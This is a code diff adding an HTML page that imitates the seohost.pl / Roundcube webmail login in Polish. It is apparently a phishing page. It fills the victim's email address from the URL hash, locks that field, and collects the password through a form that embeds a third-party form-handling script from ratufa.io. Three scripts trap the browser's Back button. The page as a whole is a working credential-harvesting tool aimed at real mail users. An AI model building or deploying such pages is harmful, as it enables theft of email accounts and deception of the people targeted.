@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta seohost.pl - Logowanie</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Top 3D Hexagon-Sphere Logo Graphic Reconstruction */
+        .logo-container {
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-graphic {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            background: conic-gradient(from 120deg at 50% 50%, #1a2a3a 25%, #29b6f6 0 50%, #0288d1 0 75%, #1a2a3a 0);
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-sphere {
+            width: 44px;
+            height: 44px;
+            background-color: #e0e0e0;
+            border-radius: 50%;
+            box-shadow: inset -4px -4px 8px rgba(0,0,0,0.15), 2px 4px 6px rgba(0,0,0,0.1);
+            position: absolute;
+            top: 10px;
+        }
+
+        /* Form Content Box Layout Component */
+        .login-box {
+            width: 100%;
+            max-width: 300px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-row {
+            display: flex;
+            width: 100%;
+            height: 38px;
+            margin-bottom: 10px;
+        }
+
+        /* Small left icon box container element */
+        .icon-box {
+            width: 38px;
+            background-color: #ffffff;
+            border: 1px solid #d3d3d3;
+            border-right: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333333;
+            font-size: 13px;
+        }
+
+        .form-control {
+            flex: 1;
+            padding: 0 12px;
+            border: 1px solid #d3d3d3;
+            font-size: 14px;
+            color: #333333;
+            outline: none;
+            border-radius: 0;
+        }
+
+        /* Customized dropdown layout field selector matching image details */
+        .select-control {
+            flex: 1;
+            padding: 0 12px;
+            border: 1px solid #d3d3d3;
+            font-size: 14px;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg fill='%23333333' height='24' viewBox='0 0 24 24' width='24' xmlns='http://w3.org'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 8px center;
+        }
+
+        .form-control::placeholder {
+            color: #a9a9a9;
+        }
+
+        /* Signature Vibrant Light Blue Rectangular Submission Button */
+        .submit-btn {
+            width: 100%;
+            background-color: #29b6f6;
+            color: #ffffff;
+            border: none;
+            height: 42px;
+            font-size: 13px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #0288d1;
+        }
+
+        /* Sub-link tracking domain name info label */
+        .sub-message {
+            text-align: center;
+            margin-top: 18px;
+            color: #888888;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .sub-message:hover {
+            color: #333333;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.15);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Branding Hexagon Logo Block Component -->
+    <div class="logo-container">
+            <img src="https://github.com/cdtechdigital/images/blob/main/cpanellogo.JPG?raw=true" alt="Trulli" width="" height="">
+ 
+        </div>
+    </div>
+    
+    <!-- Center Login Processing Form Block -->
+    <div class="login-box">
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
+            <div class="input-row">
+                <div class="icon-box">👤</div>
+                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+            </div>
+            
+            <div class="input-row">
+                <div class="icon-box">🔒</div>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+            </div>
+
+            
+            <button type="submit" class="submit-btn">LOGIN </button>
+        </form>
+        <BR><a href="#" class="sub-message">Roundcube Webmail</a>
+    </div>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
+    <div class="system-watermark">
+>
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
